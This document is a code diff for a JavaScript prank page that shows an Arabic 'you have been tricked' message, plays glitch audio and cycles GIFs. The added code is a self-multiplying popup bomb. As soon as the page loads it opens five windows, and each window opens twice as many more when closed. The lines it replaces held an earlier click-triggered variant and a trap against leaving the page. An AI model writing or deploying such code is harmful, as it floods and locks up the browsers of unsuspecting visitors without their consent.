@@ -1,7 +1,15 @@
 document.addEventListener("DOMContentLoaded", function () {
     let textContainer = document.getElementById("text-container");
+    let glitchContainer = document.getElementById("glitch-container");
     let gifContainer = document.getElementById("gif-container");
+    let staticGif = document.getElementById("static-gif");
     let bgMusic = document.getElementById("bg-music");
+
+    let gifList = [
+        "https://media4.giphy.com/media/l0Iy6fCmhY3hVGrzW/giphy.gif",
+        "https://media1.giphy.com/media/l0Iy8UHZ0T5I0EaR2/giphy.gif",
+        "https://media2.giphy.com/media/xUA7aLpbS0S3kr3s76/giphy.gif"
+    ];
 
     let message = "تم تلاعب فيك";
     let index = 0;
@@ -19,58 +27,48 @@ document.addEventListener("DOMContentLoaded", function () {
     function startGlitch() {
         setTimeout(() => {
             textContainer.style.display = "none";
-            gifContainer.style.opacity = 1;
-            bgMusic.play();
-            startImageLoop();
-        }, 2000);
-    }
+            glitchContainer.style.opacity = 1;
 
-    let gifList = [
-        "https://media4.giphy.com/media/l0Iy6fCmhY3hVGrzW/giphy.gif",
-        "https://media1.giphy.com/media/l0Iy8UHZ0T5I0EaR2/giphy.gif",
-        "https://media2.giphy.com/media/xUA7aLpbS0S3kr3s76/giphy.gif"
-    ];
+            // تشغيل صوت التشويش
+            bgMusic.src = "https://a.top4top.io/m_3362mlujq1.mp3";
+            bgMusic.play();
+        }, 2000);
+
+        // بعد 2.5 ثانية، يتم استبدال التشويش بـ GIFs
+        setTimeout(() => {
+            glitchContainer.style.opacity = 0;
+            gifContainer.style.opacity = 1;
+            bgMusic.pause();
+            bgMusic.currentTime = 0;
+            startImageLoop();
+        }, 4500);
+    }
 
     function startImageLoop() {
         let currentIndex = 0;
         setInterval(() => {
-            document.getElementById("static-gif").src = gifList[currentIndex];
+            staticGif.src = gifList[currentIndex];
             currentIndex = (currentIndex + 1) % gifList.length;
         }, 400);
     }
 
-    // 🟥🟥🟥🟥 **إضافة فتح نوافذ GIF عند الضغط على الشاشة** 🟥🟥🟥🟥
-    let popupCount = 0;
-    function openPopup() {
-        let popupSize = 150;
-        let screenWidth = window.innerWidth;
-        let screenHeight = window.innerHeight;
-        
-        let x = Math.floor(Math.random() * (screenWidth - popupSize));
-        let y = Math.floor(Math.random() * (screenHeight - popupSize));
+    let websiteURL = "https://example.com"; // ضع هنا الموقع الذي تريد فتحه
+    let popups = [];
 
-        let newWindow = window.open("", "_blank", `width=${popupSize},height=${popupSize},left=${x},top=${y}`);
-        if (newWindow) {
-            let gifIndex = Math.floor(Math.random() * gifList.length);
-            newWindow.document.write(`<img src="${gifList[gifIndex]}" width="100%" height="100%">`);
-            newWindow.document.body.style.margin = "0";
-            newWindow.document.body.style.overflow = "hidden";
-
-            newWindow.onbeforeunload = function () {
-                popupCount += 2;  // كل مرة يقفل، يفتح 2 بداله!
-                for (let i = 0; i < popupCount; i++) {
-                    openPopup();
-                }
-            };
+    function openMultipleWindows(count) {
+        for (let i = 0; i < count; i++) {
+            let newWindow = window.open(websiteURL, "_blank");
+            if (newWindow) {
+                popups.push(newWindow);
+                newWindow.onbeforeunload = function () {
+                    openMultipleWindows(popups.length * 2);
+                };
+            }
         }
     }
 
-    document.addEventListener("click", openPopup);
-
-    // 🟥🟥🟥🟥 **إجبار الصفحة على البقاء مفتوحة (للمزاح فقط)** 🟥🟥🟥🟥
-    window.onbeforeunload = function () {
-        return "لا يمكنك المغادرة!";
-    };
+    // 🔥 عند فتح الموقع، يتم فتح 5 نوافذ جديدة
+    openMultipleWindows(5);
 
     typeText();
 });
